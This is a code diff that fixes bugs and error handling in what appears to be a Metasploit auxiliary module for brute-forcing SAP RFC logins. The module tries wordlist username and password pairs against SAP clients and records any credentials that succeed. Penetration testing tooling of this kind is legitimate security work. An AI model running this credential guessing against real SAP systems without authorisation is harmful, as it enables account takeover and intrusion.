@@ -39,12 +39,11 @@ class Metasploit4 < Msf::Auxiliary
     [
       Opt::RPORT(3342),
       OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
-          File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
+        File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
     ], self.class)
   end
 
-  def run_host(ip)
-    rhost = datastore['RHOST']
+  def run_host(rhost)
     rport = datastore['RPORT']
 
     saptbl = Msf::Ui::Console::Table.new(
@@ -63,11 +62,16 @@ class Metasploit4 < Msf::Auxiliary
     client_list.each do |client|
       print_status("#{rhost}:#{rport} [SAP] Trying client: #{client}")
       each_user_pass do |user, password|
-        status = brute_user(user,
-                              client,
-                              password,
-                              rhost,
-                              rport)
+        begin
+          status = brute_user(user,
+                                client,
+                                password,
+                                rhost,
+                                rport)
+        rescue NWError
+          break
+        end
+
         if status
           saptbl << [rhost, rport, client, user, password, status]
           report_auth_info(
@@ -77,7 +81,7 @@ class Metasploit4 < Msf::Auxiliary
             :port => rport,
             :client => client,
             :user => user,
-            :pass => pass,
+            :pass => password,
             :sysnr => system_number,
             :source_type => "user_supplied",
             :target_host => rhost,
@@ -92,27 +96,15 @@ class Metasploit4 < Msf::Auxiliary
     end
   end
 
-  def brute_user(user, client, pass, rhost, rport)
+  def brute_user(username, client, password, rhost, rport)
     begin
-      status, conn = login(rhost, rport, client, username, password)
-      conn.connection_info
-      return ''
+      conn = login(rhost, rport, client, username, password)
+      return 'active'
     rescue NWError => e
-      case e.code
-      when :RFC_OK
-        return ''
-      when /Name or password is incorrect/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - credentials incorrect for client: #{client} username: #{user} password: #{pass}")
+      case e.message
       when /not available in this system/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - client #{client} does not exist")
-      when /Connection refused/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (refused)")
-      when /No route to host/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (unreachable)")
-      when /Gateway not connected to local/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - gateway not configured")
-      when /unknown/i
-        vprint_error("#{rhost}:#{rport} [SAP] login failed - communication failure (hostname unknown)")
+        vprint_error("#{rhost}:#{rport} [SAP] #{e.message} - skipping client")
+        raise e
       when /Password must be changed/i
         return 'pass change'
       when /Password logon no longer possible - too many failed attempts/i
